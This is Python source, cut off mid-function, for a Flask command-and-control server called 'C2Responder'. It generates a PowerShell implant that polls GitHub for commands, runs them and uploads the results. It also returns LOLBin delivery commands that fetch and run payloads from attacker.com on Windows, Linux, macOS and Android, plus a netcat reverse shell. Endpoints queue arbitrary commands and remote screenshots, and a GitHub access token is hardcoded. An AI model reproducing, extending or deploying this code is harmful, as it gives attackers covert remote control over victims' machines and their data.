# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from flask_cors import CORS
from pymongo import MongoClient
from bson import ObjectId
import uuid
import requests
import base64
import json
import datetime
import threading

app = Flask(__name__)
CORS(app, origins="*")  # Allow all origins

# Connect to MongoDB (default localhost:27017)
client = MongoClient("mongodb://localhost:27017/")
db = client["C2Responder"]          # Database
configs = db["configs"]             # Collection

def clean_doc(doc):
    """Convert ObjectId to str recursively in a doc"""
    if isinstance(doc, list):
        return [clean_doc(d) for d in doc]
    if isinstance(doc, dict):
        return {k: clean_doc(v) for k, v in doc.items()}
    if isinstance(doc, ObjectId):
        return str(doc)
    return doc

# -----------------------------
# Federated Learning (in-memory)
# -----------------------------

fl_lock = threading.Lock()
fl_state = {
    "active": False,
    "round_id": None,
    "created_at": None,
    "config": {
        "vector_size": 100,
        "min_clients": 1,
    },
    "global_weights": [],  # list[float]
    "updates": [],          # list[{client_id, num_samples, weights}]
}

def _zeros(n):
    return [0.0 for _ in range(n)]

def _fedavg(updates, vector_size):
    if not updates:
        return None
    total_samples = sum(u.get("num_samples", 1) for u in updates)
    if total_samples == 0:
        total_samples = 1
    agg = _zeros(vector_size)
    for u in updates:
        w = u.get("weights", [])
        ns = u.get("num_samples", 1)
        if len(w) != vector_size:
            continue
        for i in range(vector_size):
            agg[i] += (w[i] * ns)
    for i in range(vector_size):
        agg[i] /= float(total_samples)
    return agg

@app.route("/fl/start-round", methods=["POST"])
def fl_start_round():
    try:
        data = request.get_json(silent=True) or {}
        vector_size = int(data.get("vector_size", 100))
        min_clients = int(data.get("min_clients", 1))
        round_id = str(uuid.uuid4())

        with fl_lock:
            fl_state["active"] = True
            fl_state["round_id"] = round_id
            fl_state["created_at"] = datetime.datetime.now().isoformat()
            fl_state["config"] = {"vector_size": vector_size, "min_clients": min_clients}
            fl_state["global_weights"] = _zeros(vector_size)
            fl_state["updates"] = []

        return jsonify({
            "status": "success",
            "round_id": round_id,
            "config": fl_state["config"],
            "global_weights": fl_state["global_weights"],
        })
    except Exception as e:
        print(f"Error in fl_start_round: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/fl/config", methods=["GET"])
def fl_get_config():
    try:
        with fl_lock:
            if not fl_state["active"] or not fl_state["round_id"]:
                return jsonify({"status": "error", "message": "No active round"}), 400
            return jsonify({
                "status": "success",
                "round_id": fl_state["round_id"],
                "config": fl_state["config"],
                "global_weights": fl_state["global_weights"],
            })
    except Exception as e:
        print(f"Error in fl_get_config: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/fl/submit-update", methods=["POST"])
def fl_submit_update():
    try:
        data = request.get_json()
        client_id = data.get("client_id")
        weights = data.get("weights")
        num_samples = int(data.get("num_samples", 1))

        if client_id is None or weights is None:
            return jsonify({"status": "error", "message": "client_id and weights are required"}), 400

        with fl_lock:
            if not fl_state["active"] or not fl_state["round_id"]:
                return jsonify({"status": "error", "message": "No active round"}), 400

            vector_size = fl_state["config"].get("vector_size", 100)
            if len(weights) != vector_size:
                return jsonify({"status": "error", "message": f"weights must be length {vector_size}"}), 400

            fl_state["updates"].append({
                "client_id": client_id,
                "weights": weights,
                "num_samples": num_samples,
                "received_at": datetime.datetime.now().isoformat(),
            })

            # If we have min_clients, aggregate now; otherwise aggregate on each submit
            min_clients = fl_state["config"].get("min_clients", 1)
            if len(fl_state["updates"]) >= max(1, min_clients):
                new_weights = _fedavg(fl_state["updates"], vector_size)
                if new_weights is not None:
                    fl_state["global_weights"] = new_weights
                    fl_state["updates"] = []

            return jsonify({
                "status": "success",
                "round_id": fl_state["round_id"],
                "global_weights": fl_state["global_weights"],
                "pending_updates": len(fl_state["updates"]),
            })
    except Exception as e:
        print(f"Error in fl_submit_update: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/fl/status", methods=["GET"])
def fl_status():
    try:
        with fl_lock:
            return jsonify({
                "status": "success",
                "active": fl_state["active"],
                "round_id": fl_state["round_id"],
                "created_at": fl_state["created_at"],
                "config": fl_state["config"],
                "global_weights": fl_state["global_weights"],
                "received_updates": len(fl_state["updates"]),
            })
    except Exception as e:
        print(f"Error in fl_status: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/configinput", methods=["POST"])
def config_input():
    try:
        data = request.get_json()
        print(f"Received data: {data}")
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        username = data.get("username", "unknown")
        timestamp = data.get("timestamp", "")
        
        # Extract all configuration fields (excluding username and timestamp)
        config_fields = {}
        for key, value in data.items():
            if key not in ["username", "timestamp"]:
                config_fields[key] = value
        
        print(f"Extracted config fields: {config_fields}")
        
        if not config_fields:
            return jsonify({"status": "error", "message": "No configuration fields found"}), 400
        
        # Check if user config already exists (single document per user)
        existing = configs.find_one({"username": username})
        
        if existing:
            # UPDATE existing document with all new config fields
            print(f"Updating existing config for user: {username}")
            result = configs.update_one(
                {"username": username},
                {"$set": {
                    **config_fields,
                    "timestamp": timestamp
                }}
            )
            action = "updated"
            doc_id = str(existing["_id"])
        else:
            # CREATE new document with all config
            print(f"Creating new config for user: {username}")
            new_doc = {
                "username": username,
                "timestamp": timestamp,
                **config_fields
            }
            result = configs.insert_one(new_doc)
            action = "created"
            doc_id = str(result.inserted_id)
        
        return jsonify({
            "status": "success",
            "message": f"Configuration {action} successfully",
            "action": action,
            "id": doc_id
        })
        
    except Exception as e:
        print(f"Error in config_input: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/config", methods=["GET"])
def get_config():
    try:
        username = request.args.get("username", "admin")
        print(f"Getting config for username: {username}")
        
        # Get the single configuration document for the user
        user_config = configs.find_one({"username": username})
        
        if not user_config:
            print(f"No config found for user: {username}")
            return jsonify({
                "status": "success",
                "message": "No configuration found",
                "data": {}
            })
        
        # Return all config data (excluding internal fields)
        frontend_data = {}
        for key, value in user_config.items():
            if key not in ["_id", "username", "timestamp"]:
                frontend_data[key] = value
        
        print(f"Returning config data: {frontend_data}")
        
        return jsonify({
            "status": "success",
            "message": "Configuration retrieved successfully",
            "data": frontend_data
        })
        
    except Exception as e:
        print(f"Error in get_config: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/debug/configs", methods=["GET"])
def debug_configs():
    """Debug endpoint to show all configurations in the database"""
    try:
        all_configs = list(configs.find({}))
        cleaned_configs = [clean_doc(config) for config in all_configs]
        
        return jsonify({
            "status": "success",
            "total_configs": len(cleaned_configs),
            "configs": cleaned_configs
        })
        
    except Exception as e:
        print(f"Error in debug_configs: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/delivery-formats", methods=["GET"])
def get_delivery_formats():
    """Get available LOLBin options for agent building based on platform"""
    try:
        # Get platform from query parameters
        platform = request.args.get("platform", "windows")
        
        print(f"Getting LOLBin options for platform: {platform}")
        
        # LOLBin options for each platform
        platform_lolbins = {
            "windows": [
                "PowerShell LOLBin",
                "CMD/Batch LOLBin",
                "Regsvr32 LOLBin",
                "Rundll32 LOLBin",
                "MSBuild LOLBin",
                "Certutil LOLBin",
                "Wmic LOLBin",
                "Bcdedit LOLBin"
            ],
            "linux": [
                "Bash LOLBin",
                "Curl/Wget LOLBin",
                "Python LOLBin",
                "Perl LOLBin",
                "Awk LOLBin",
                "Sed LOLBin",
                "Netcat LOLBin",
                "SSH LOLBin"
            ],
            "macos": [
                "Bash/Zsh LOLBin",
                "Curl LOLBin",
                "Python LOLBin",
                "Ruby LOLBin",
                "Swift LOLBin",
                "JXA LOLBin",
                "Osascript LOLBin",
                "Launchctl LOLBin"
            ],
            "android": [
                "Termux LOLBin",
                "Wget LOLBin",
                "Python LOLBin",
                "Busybox LOLBin",
                "ADB LOLBin",
                "Fastboot LOLBin"
            ]
        }
        
        # Get GitHub configuration for dynamic command generation
        username = request.args.get("username", "admin")
        user_config = configs.find_one({"username": username})
        
        if user_config:
            github_username = user_config.get("github_username", "HackWidMaddy")
            github_repo = user_config.get("github_repo", "C2Responder")
            github_pat = user_config.get("github_pat", "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")
        else:
            # Fallback values
            github_username = "HackWidMaddy"
            github_repo = "C2Responder"
            github_pat = "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"
        
        # Generate a UUID for this request
        bot_uuid = str(uuid.uuid4())
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        print(f"Creating GitHub files for bot UUID: {bot_uuid}")
        print(f"GitHub config - Username: {github_username}, Repo: {github_repo}")
        
        # First, check if repository exists and we have access
        repo_url = f"https://api.github.com/repos/{github_username}/{github_repo}"
        repo_response = requests.get(repo_url, headers=headers)
        print(f"Repository check response: {repo_response.status_code}")
        
        if repo_response.status_code != 200:
            print(f"Repository access failed: {repo_response.status_code} - {repo_response.text}")
            return jsonify({"status": "error", "message": f"Repository access failed: {repo_response.status_code}"}), 500
        
        # Create commands and results files in GitHub
        commands_content = f"# Commands for bot {bot_uuid}\n# Created at {datetime.datetime.now().isoformat()}"
        results_content = f"# Results for bot {bot_uuid}\n# Created at {datetime.datetime.now().isoformat()}"
        
        # Create commands file
        commands_data = {
            "message": f"Create commands file for bot {bot_uuid}",
            "content": base64.b64encode(commands_content.encode()).decode(),
            "path": f"commands/{bot_uuid}.txt"
        }
        
        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{bot_uuid}.txt"
        print(f"Creating commands file at: {commands_url}")
        commands_response = requests.put(commands_url, headers=headers, json=commands_data)
        
        print(f"Commands file response: {commands_response.status_code}")
        print(f"Commands file response text: {commands_response.text}")
        
        if commands_response.status_code not in [201, 200]:
            print(f"Failed to create commands file: {commands_response.status_code} - {commands_response.text}")
            return jsonify({"status": "error", "message": f"Failed to create commands file: {commands_response.status_code}"}), 500
        
        # Create results file
        results_data = {
            "message": f"Create results file for bot {bot_uuid}",
            "content": base64.b64encode(results_content.encode()).decode(),
            "path": f"results/{bot_uuid}.txt"
        }
        
        results_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/results/{bot_uuid}.txt"
        print(f"Creating results file at: {results_url}")
        results_response = requests.put(results_url, headers=headers, json=results_data)
        
        print(f"Results file response: {results_response.status_code}")
        print(f"Results file response text: {results_response.text}")
        
        if results_response.status_code not in [201, 200]:
            print(f"Failed to create results file: {results_response.status_code} - {results_response.text}")
            return jsonify({"status": "error", "message": f"Failed to create results file: {results_response.status_code}"}), 500
        
        # Store bot information in MongoDB bots collection
        bot_data = {
            "uuid": bot_uuid,
            "username": username,
            "platform": platform,
            "github_username": github_username,
            "github_repo": github_repo,
            "commands_file": f"commands/{bot_uuid}.txt",
            "results_file": f"results/{bot_uuid}.txt",
            "created_at": datetime.datetime.now().isoformat(),
            "status": "active",
            "last_seen": None,
            "capabilities": [],
            "transport_channel": "github"
        }
        
        # Create bots collection if it doesn't exist
        bots = db["bots"]
        bot_result = bots.insert_one(bot_data)
        
        print(f"Bot created successfully with UUID: {bot_uuid}")
        print(f"Bot stored in MongoDB with ID: {bot_result.inserted_id}")
        
        # Generate the dynamic PowerShell command with infinite loop and SHA handling
        dynamic_powershell_command = f'$RepoOwner="{github_username}";$RepoName="{github_repo}";$BotID="{bot_uuid}";$PAT="{github_pat}";$AuthHeader=@{{Authorization="token $PAT"}};$CmdUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt";$ResUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt";while($true){{try{{$resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split "`n";$cmdSha=$resp.sha}}catch{{$cmds=@();$cmdSha=$null}};$results=@();foreach($c in $cmds){{if(-not [string]::IsNullOrWhiteSpace($c)){{try{{$results+=(&([ScriptBlock]::Create($c)) | Out-String)}}catch{{$results+=$_.Exception.Message}}}}}};$resultContent=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($results -join "`n")));try{{$existing=Invoke-RestMethod -Uri $ResUrl -Headers $AuthHeader;$sha=$existing.sha}}catch{{$sha=$null}};$putBody=@{{message="Update $BotID results";content=$resultContent}};if($sha){{$putBody.sha=$sha}};try{{Invoke-RestMethod -Uri $ResUrl -Method Put -Headers $AuthHeader -Body ($putBody|ConvertTo-Json)}}catch{{Write-Host "Results update failed: $($_.Exception.Message)"}};if($cmdSha -and $cmds.Count -gt 0){{Start-Sleep -Seconds 2;try{{$currentCmd=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$clearBody=@{{message="Clear $BotID commands";content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""));sha=$currentCmd.sha}};Invoke-RestMethod -Uri $CmdUrl -Method Put -Headers $AuthHeader -Body ($clearBody|ConvertTo-Json)}}catch{{Write-Host "Commands clear failed: $($_.Exception.Message) - will retry next cycle"}}}};Start-Sleep -Seconds 5}}'
        
        # LOLBin commands for each platform
        lolbin_commands = {
            "windows": {
                "PowerShell LOLBin": dynamic_powershell_command,
                "CMD/Batch LOLBin": f"cmd /c \"{dynamic_powershell_command}\"",
                "Regsvr32 LOLBin": f"regsvr32 /s /u /i:http://attacker.com/payload.sct scrobj.dll",
                "Rundll32 LOLBin": f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document=\\..\\mshtml,RunHTMLApplication\";document=document.createElement('script');document.body.appendChild(document.createElement('script')).src='http://attacker.com/payload.js';",
                "MSBuild LOLBin": f"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe http://attacker.com/payload.xml",
                "Certutil LOLBin": f"certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe",
                "Wmic LOLBin": f"wmic process call create \"cmd.exe /c {dynamic_powershell_command}\"",
                "Bcdedit LOLBin": f"bcdedit /set {{default}} bootmenupolicy legacy && bcdedit /set {{default}} bootstatuspolicy ignoreallfailures"
            },
            "linux": {
                "Bash LOLBin": "bash -c \"curl -s http://attacker.com/payload.sh | bash\"",
                "Curl/Wget LOLBin": "curl -s http://attacker.com/payload.sh | bash",
                "Python LOLBin": "python -c \"import urllib2; exec(urllib2.urlopen('http://attacker.com/payload.py').read())\"",
                "Perl LOLBin": "perl -e \"use LWP::Simple; eval get('http://attacker.com/payload.pl')\"",
                "Awk LOLBin": "awk 'BEGIN {system(\"curl -s http://attacker.com/payload.sh | bash\")}'",
                "Sed LOLBin": "sed 's/.*/curl -s http:\/\/attacker.com\/payload.sh | bash/' /dev/null | bash",
                "Netcat LOLBin": "nc attacker.com 4444 -e /bin/bash",
                "SSH LOLBin": "ssh -o ProxyCommand=\"nc -X connect -x attacker.com:8080 %h %p\" user@target.com"
            },
            "macos": {
                "Bash/Zsh LOLBin": "bash -c \"curl -s http://attacker.com/payload.sh | bash\"",
                "Curl LOLBin": "curl -s http://attacker.com/payload.sh | bash",
                "Python LOLBin": "python -c \"import urllib2; exec(urllib2.urlopen('http://attacker.com/payload.py').read())\"",
                "Ruby LOLBin": "ruby -e \"eval(open('http://attacker.com/payload.rb').read)\"",
                "Swift LOLBin": "swift -e \"import Foundation; let url = URL(string: \\\"http://attacker.com/payload.swift\\\")!; let data = try Data(contentsOf: url); eval(String(data: data, encoding: .utf8)!)\"",
                "JXA LOLBin": "osascript -l JavaScript -e \"eval(ObjC.unwrap(NSString.alloc().initWithContentsOfURL(NSURL.URLWithString('http://attacker.com/payload.js'))))\"",
                "Osascript LOLBin": "osascript -e \"do shell script \\\"curl -s http://attacker.com/payload.sh | bash\\\"\"",
                "Launchctl LOLBin": "launchctl submit -l com.attacker.payload -- /bin/bash -c \"curl -s http://attacker.com/payload.sh | bash\""
            },
            "android": {
                "Termux LOLBin": "termux-exec bash -c \"curl -s http://attacker.com/payload.sh | bash\"",
                "Wget LOLBin": "wget -qO- http://attacker.com/payload.sh | sh",
                "Python LOLBin": "python -c \"import urllib2; exec(urllib2.urlopen('http://attacker.com/payload.py').read())\"",
                "Busybox LOLBin": "busybox wget -qO- http://attacker.com/payload.sh | sh",
                "ADB LOLBin": "adb shell \"curl -s http://attacker.com/payload.sh | sh\"",
                "Fastboot LOLBin": "fastboot oem exec \"curl -s http://attacker.com/payload.sh | sh\""
            }
        }
        
        # Get LOLBin options for the selected platform
        lolbin_options = platform_lolbins.get(platform, [])
        platform_commands = lolbin_commands.get(platform, {})
        
        print(f"Returning {len(lolbin_options)} LOLBin options for {platform}")
        
        return jsonify({
            "status": "success",
            "message": f"LOLBin options retrieved successfully for {platform}",
            "formats": lolbin_options,
            "total_formats": len(lolbin_options),
            "platform": platform,
            "lolbin_commands": platform_commands
        })
        
    except Exception as e:
        print(f"Error in get_delivery_formats: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/create-agent", methods=["POST"])
def create_agent():
    """Create a new agent with UUID and GitHub integration"""
    try:
        data = request.get_json()
        print(f"Creating agent with data: {data}")
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        platform = data.get("platform", "windows")
        transport_channel = data.get("transport_channel", "github")
        lolbin_format = data.get("lolbin_format", "PowerShell LOLBin")
        username = data.get("username", "admin")
        
        # Generate UUID for the agent
        agent_uuid = str(uuid.uuid4())
        print(f"Generated UUID: {agent_uuid}")
        
        # Get GitHub configuration from MongoDB
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        print(f"GitHub config - Username: {github_username}, Repo: {github_repo}")
        print(f"Using PAT: {github_pat[:10]}...")
        
        # First, check if repository exists and we have access
        repo_url = f"https://api.github.com/repos/{github_username}/{github_repo}"
        repo_response = requests.get(repo_url, headers=headers)
        print(f"Repository check response: {repo_response.status_code}")
        
        if repo_response.status_code != 200:
            print(f"Repository access failed: {repo_response.status_code} - {repo_response.text}")
            return jsonify({"status": "error", "message": f"Repository access failed: {repo_response.status_code}"}), 500
        
        # Create commands and results files in GitHub
        commands_content = f"# Commands for agent {agent_uuid}\n# Created at {datetime.datetime.now().isoformat()}"
        results_content = f"# Results for agent {agent_uuid}\n# Created at {datetime.datetime.now().isoformat()}"
        
        # Create commands file
        commands_data = {
            "message": f"Create commands file for agent {agent_uuid}",
            "content": base64.b64encode(commands_content.encode()).decode(),
            "path": f"commands/{agent_uuid}.txt"
        }
        
        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{agent_uuid}.txt"
        print(f"Creating commands file at: {commands_url}")
        commands_response = requests.put(commands_url, headers=headers, json=commands_data)
        
        print(f"Commands file response: {commands_response.status_code}")
        print(f"Commands file response text: {commands_response.text}")
        
        if commands_response.status_code not in [201, 200]:
            print(f"Failed to create commands file: {commands_response.status_code} - {commands_response.text}")
            return jsonify({"status": "error", "message": f"Failed to create commands file: {commands_response.status_code}"}), 500
        
        # Create results file
        results_data = {
            "message": f"Create results file for agent {agent_uuid}",
            "content": base64.b64encode(results_content.encode()).decode(),
            "path": f"results/{agent_uuid}.txt"
        }
        
        results_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/results/{agent_uuid}.txt"
        print(f"Creating results file at: {results_url}")
        results_response = requests.put(results_url, headers=headers, json=results_data)
        
        print(f"Results file response: {results_response.status_code}")
        print(f"Results file response text: {results_response.text}")
        
        if results_response.status_code not in [201, 200]:
            print(f"Failed to create results file: {results_response.status_code} - {results_response.text}")
            return jsonify({"status": "error", "message": f"Failed to create results file: {results_response.status_code}"}), 500
        
        # Generate PowerShell command with the new UUID using the specific format with infinite loop and SHA handling
        powershell_command = f'$RepoOwner="{github_username}";$RepoName="{github_repo}";$BotID="{agent_uuid}";$PAT="{github_pat}";$AuthHeader=@{{Authorization="token $PAT"}};$CmdUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt";$ResUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt";while($true){{try{{$resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split "`n";$cmdSha=$resp.sha}}catch{{$cmds=@();$cmdSha=$null}};$results=@();foreach($c in $cmds){{if(-not [string]::IsNullOrWhiteSpace($c)){{try{{$results+=(&([ScriptBlock]::Create($c)) | Out-String)}}catch{{$results+=$_.Exception.Message}}}}}};$resultContent=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($results -join "`n")));try{{$existing=Invoke-RestMethod -Uri $ResUrl -Headers $AuthHeader;$sha=$existing.sha}}catch{{$sha=$null}};$putBody=@{{message="Update $BotID results";content=$resultContent}};if($sha){{$putBody.sha=$sha}};try{{Invoke-RestMethod -Uri $ResUrl -Method Put -Headers $AuthHeader -Body ($putBody|ConvertTo-Json)}}catch{{Write-Host "Results update failed: $($_.Exception.Message)"}};if($cmdSha -and $cmds.Count -gt 0){{Start-Sleep -Seconds 2;try{{$currentCmd=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$clearBody=@{{message="Clear $BotID commands";content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""));sha=$currentCmd.sha}};Invoke-RestMethod -Uri $CmdUrl -Method Put -Headers $AuthHeader -Body ($clearBody|ConvertTo-Json)}}catch{{Write-Host "Commands clear failed: $($_.Exception.Message) - will retry next cycle"}}}};Start-Sleep -Seconds 5}}'
        
        # Store agent information in MongoDB
        agent_data = {
            "uuid": agent_uuid,
            "username": username,
            "platform": platform,
            "transport_channel": transport_channel,
            "lolbin_format": lolbin_format,
            "github_repo": github_repo,
            "commands_file": f"commands/{agent_uuid}.txt",
            "results_file": f"results/{agent_uuid}.txt",
            "created_at": datetime.datetime.now().isoformat(),
            "status": "active"
        }
        
        # Create agents collection if it doesn't exist
        agents = db["agents"]
        result = agents.insert_one(agent_data)
        
        print(f"Agent created successfully with UUID: {agent_uuid}")
        
        return jsonify({
            "status": "success",
            "message": f"Agent created successfully",
            "agent_uuid": agent_uuid,
            "platform": platform,
            "transport_channel": transport_channel,
            "lolbin_format": lolbin_format,
            "powershell_command": powershell_command,
            "github_files": {
                "commands": f"commands/{agent_uuid}.txt",
                "results": f"results/{agent_uuid}.txt"
            }
        })
        
    except Exception as e:
        print(f"Error in create_agent: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/bots", methods=["GET"])
def get_bots():
    """Get all bots for a user from MongoDB"""
    try:
        username = request.args.get("username", "admin")
        print(f"Getting bots for username: {username}")
        
        # Get bots from MongoDB
        bots = db["bots"]
        user_bots = list(bots.find({"username": username}))
        
        # Clean ObjectId fields
        cleaned_bots = []
        for bot in user_bots:
            bot["_id"] = str(bot["_id"])
            cleaned_bots.append(bot)
        
        print(f"Found {len(cleaned_bots)} bots for user {username}")
        
        return jsonify({
            "status": "success",
            "message": f"Retrieved {len(cleaned_bots)} bots successfully",
            "bots": cleaned_bots
        })
        
    except Exception as e:
        print(f"Error in get_bots: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/execute-command", methods=["POST"])
def execute_command():
    """Execute a command on a specific bot by writing to GitHub commands file"""
    try:
        data = request.get_json()
        print(f"Executing command with data: {data}")
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        bot_uuid = data.get("bot_uuid")
        command = data.get("command")
        username = data.get("username", "admin")
        
        if not bot_uuid or not command:
            return jsonify({"status": "error", "message": "Bot UUID and command are required"}), 400
        
        # Get bot information from MongoDB
        bots = db["bots"]
        bot = bots.find_one({"uuid": bot_uuid, "username": username})
        
        if not bot:
            return jsonify({"status": "error", "message": "Bot not found"}), 404
        
        # Get GitHub configuration
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Get current commands file content
        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{bot_uuid}.txt"
        commands_response = requests.get(commands_url, headers=headers)
        
        if commands_response.status_code != 200:
            return jsonify({"status": "error", "message": "Failed to access commands file"}), 500
        
        current_content = commands_response.json()
        current_sha = current_content["sha"]
        
        # Prepare new content with the command
        new_content = f"{command}\n"
        encoded_content = base64.b64encode(new_content.encode()).decode()
        
        # Update commands file
        update_data = {
            "message": f"Add command for bot {bot_uuid}",
            "content": encoded_content,
            "sha": current_sha
        }
        
        update_response = requests.put(commands_url, headers=headers, json=update_data)
        
        if update_response.status_code not in [200, 201]:
            print(f"Failed to update commands file: {update_response.status_code} - {update_response.text}")
            return jsonify({"status": "error", "message": "Failed to write command to GitHub"}), 500
        
        print(f"Command '{command}' written to GitHub for bot {bot_uuid}")
        
        return jsonify({
            "status": "success",
            "message": "Command sent successfully",
            "bot_uuid": bot_uuid,
            "command": command
        })
        
    except Exception as e:
        print(f"Error in execute_command: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/get-results", methods=["GET"])
def get_results():
    """Get results from a specific bot's results file"""
    try:
        bot_uuid = request.args.get("bot_uuid")
        username = request.args.get("username", "admin")
        
        if not bot_uuid:
            return jsonify({"status": "error", "message": "Bot UUID is required"}), 400
        
        # Get bot information from MongoDB
        bots = db["bots"]
        bot = bots.find_one({"uuid": bot_uuid, "username": username})
        
        if not bot:
            return jsonify({"status": "error", "message": "Bot not found"}), 404
        
        # Get GitHub configuration
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Get results file content
        results_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/results/{bot_uuid}.txt"
        results_response = requests.get(results_url, headers=headers)
        
        if results_response.status_code != 200:
            return jsonify({"status": "error", "message": "Failed to access results file"}), 500
        
        results_content = results_response.json()
        results_data = base64.b64decode(results_content["content"]).decode()
        
        # Check if there are actual results (not just the initial content or cleared content)
        if (results_data.strip() and 
            not results_data.startswith("# Results for bot") and 
            not results_data.startswith("# Results cleared")):
            
            # Clear the results file immediately after reading
            clear_data = {
                "message": f"Clear results for bot {bot_uuid}",
                "content": base64.b64encode("# Results cleared\n".encode()).decode(),
                "sha": results_content["sha"]
            }
            
            clear_response = requests.put(results_url, headers=headers, json=clear_data)
            if clear_response.status_code not in [200, 201]:
                print(f"Warning: Failed to clear results file: {clear_response.status_code}")
            
            return jsonify({
                "status": "success",
                "message": "Results retrieved successfully",
                "results": results_data,
                "bot_uuid": bot_uuid
            })
        else:
            return jsonify({
                "status": "success",
                "message": "No new results available",
                "results": None,
                "bot_uuid": bot_uuid
            })
        
    except Exception as e:
        print(f"Error in get_results: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/screenshot", methods=["POST"])
def take_screenshot():
    """Take a screenshot of the target machine using PowerShell"""
    try:
        data = request.get_json()
        print(f"Taking screenshot with data: {data}")
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        bot_uuid = data.get("bot_uuid")
        username = data.get("username", "admin")
        
        if not bot_uuid:
            return jsonify({"status": "error", "message": "Bot UUID is required"}), 400
        
        # Get bot information from MongoDB
        bots = db["bots"]
        bot = bots.find_one({"uuid": bot_uuid, "username": username})
        
        if not bot:
            return jsonify({"status": "error", "message": "Bot not found"}), 404
        
        # Get GitHub configuration
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # PowerShell screenshot command that captures screen and returns base64
        screenshot_command = '''Add-Type -AssemblyName System.Drawing, System.Windows.Forms; $b = New-Object Drawing.Bitmap ([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); [Drawing.Graphics]::FromImage($b).CopyFromScreen([Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [Drawing.Point]::Empty, $b.Size); $ms = New-Object IO.MemoryStream; $b.Save($ms, [Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($ms.ToArray())'''
        
        # Get current commands file content
        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{bot_uuid}.txt"
        commands_response = requests.get(commands_url, headers=headers)
        
        if commands_response.status_code != 200:
            return jsonify({"status": "error", "message": "Failed to access commands file"}), 500
        
        current_content = commands_response.json()
        current_sha = current_content["sha"]
        
        # Prepare new content with the screenshot command
        new_content = f"{screenshot_command}\n"
        encoded_content = base64.b64encode(new_content.encode()).decode()
        
        # Update commands file
        update_data = {
